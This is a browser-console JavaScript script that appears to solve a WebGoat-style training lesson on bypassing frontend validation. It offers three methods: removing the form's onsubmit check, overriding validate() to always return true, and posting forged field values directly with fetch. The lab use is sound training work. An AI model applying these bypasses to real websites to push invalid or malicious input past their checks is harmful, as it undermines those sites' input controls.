// ============================================================
// Frontend Validation Bypass - PERFECT SOLUTION
// ============================================================
// Copy this entire script into browser console (F12)
// ============================================================

console.log('%c====================================', 'color: cyan; font-weight: bold');
console.log('%cFrontend Validation Bypass', 'color: cyan; font-weight: bold');
console.log('%c====================================', 'color: cyan; font-weight: bold');
console.log('');

// Method 1: Remove onsubmit validation and set invalid values
function bypassValidation() {
    console.log('%c[Method 1] Bypass validation function', 'color: yellow; font-weight: bold');
    console.log('');
    
    try {
        // Get the form
        const form = document.getElementById('frontendValidation');
        
        // Remove the onsubmit validation
        form.onsubmit = null;
        form.removeAttribute('onsubmit');
        console.log('✓ Removed onsubmit validation');
        
        // Set invalid values for all fields
        document.querySelector('textarea[name="field1"]').value = 'ABC';
        console.log('✓ field1 = ABC (uppercase, violates ^[a-z]{3}$)');
        
        document.querySelector('textarea[name="field2"]').value = 'abc';
        console.log('✓ field2 = abc (letters, violates ^[0-9]{3}$)');
        
        document.querySelector('textarea[name="field3"]').value = 'test!';
        console.log('✓ field3 = test! (special char, violates ^[a-zA-Z0-9 ]*$)');
        
        document.querySelector('textarea[name="field4"]').value = 'ten';
        console.log('✓ field4 = ten (not in enum, violates ^(one|two|...|nine)$)');
        
        document.querySelector('textarea[name="field5"]').value = '1234';
        console.log('✓ field5 = 1234 (4 digits, violates ^\\d{5}$)');
        
        document.querySelector('textarea[name="field6"]').value = '123456789';
        console.log('✓ field6 = 123456789 (wrong format, violates ^\\d{5}(-\\d{4})?$)');
        
        document.querySelector('textarea[name="field7"]').value = '101-234-5678';
        console.log('✓ field7 = 101-234-5678 (starts with 1, violates ^[2-9]\\d{2}-?\\d{3}-?\\d{4}$)');
        
        // Set error field to 0 (pretend validation passed)
        document.querySelector('input[name="error"]').value = '0';
        console.log('✓ Set error=0');
        
        console.log('');
        console.log('%cSubmitting form...', 'color: green; font-weight: bold');
        
        // Submit the form
        form.submit();
        
    } catch (error) {
        console.error('Error:', error.message);
    }
}

// Method 2: Override validate() function
function bypassByOverride() {
    console.log('%c[Method 2] Override validate() function', 'color: yellow; font-weight: bold');
    console.log('');
    
    try {
        // Override the validate function to always return true
        window.validate = function() {
            console.log('✓ Validation bypassed - always returning true');
            return true;
        };
        
        // Set invalid values
        document.querySelector('textarea[name="field1"]').value = 'ABC';
        document.querySelector('textarea[name="field2"]').value = 'abc';
        document.querySelector('textarea[name="field3"]').value = 'test!';
        document.querySelector('textarea[name="field4"]').value = 'ten';
        document.querySelector('textarea[name="field5"]').value = '1234';
        document.querySelector('textarea[name="field6"]').value = '123456789';
        document.querySelector('textarea[name="field7"]').value = '101-234-5678';
        
        console.log('✓ All fields set to invalid values');
        console.log('');
        console.log('%cNow click the Submit button manually!', 'color: green; font-weight: bold');
        
    } catch (error) {
        console.error('Error:', error.message);
    }
}

// Method 3: Direct Fetch API bypass
async function bypassWithFetch() {
    console.log('%c[Method 3] Direct Fetch API', 'color: yellow; font-weight: bold');
    console.log('');
    
    const formData = new URLSearchParams({
        field1: 'ABC',
        field2: 'abc',
        field3: 'test!',
        field4: 'ten',
        field5: '1234',
        field6: '123456789',
        field7: '101-234-5678',
        error: '0'
    });
    
    console.log('Payload:', formData.toString());
    console.log('');
    
    try {
        const response = await fetch('BypassRestrictions/frontendValidation', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded'
            },
            body: formData.toString(),
            credentials: 'include'
        });
        
        const result = await response.json();
        
        console.log('%cResponse:', 'color: green; font-weight: bold');
        console.log('Feedback:', result.feedback);
        console.log('Lesson Completed:', result.lessonCompleted);
        console.log('');
        
        if (result.lessonCompleted === true) {
            console.log('%c✓ SUCCESS! Challenge completed!', 'color: green; font-weight: bold; font-size: 16px');
        }
        
        return result;
        
    } catch (error) {
        console.error('Error:', error.message);
    }
}

// Display menu
console.log('%cAvailable methods:', 'color: cyan; font-weight: bold');
console.log('');
console.log('%c1. bypassValidation()    ', 'color: white', '← Remove validation & submit (BEST)');
console.log('%c2. bypassByOverride()    ', 'color: white', '← Override validate(), then click Submit');
console.log('%c3. bypassWithFetch()     ', 'color: white', '← Direct Fetch API');
console.log('');
console.log('%cRecommended: Type "bypassValidation()" and press Enter', 'color: yellow; font-weight: bold');
console.log('');
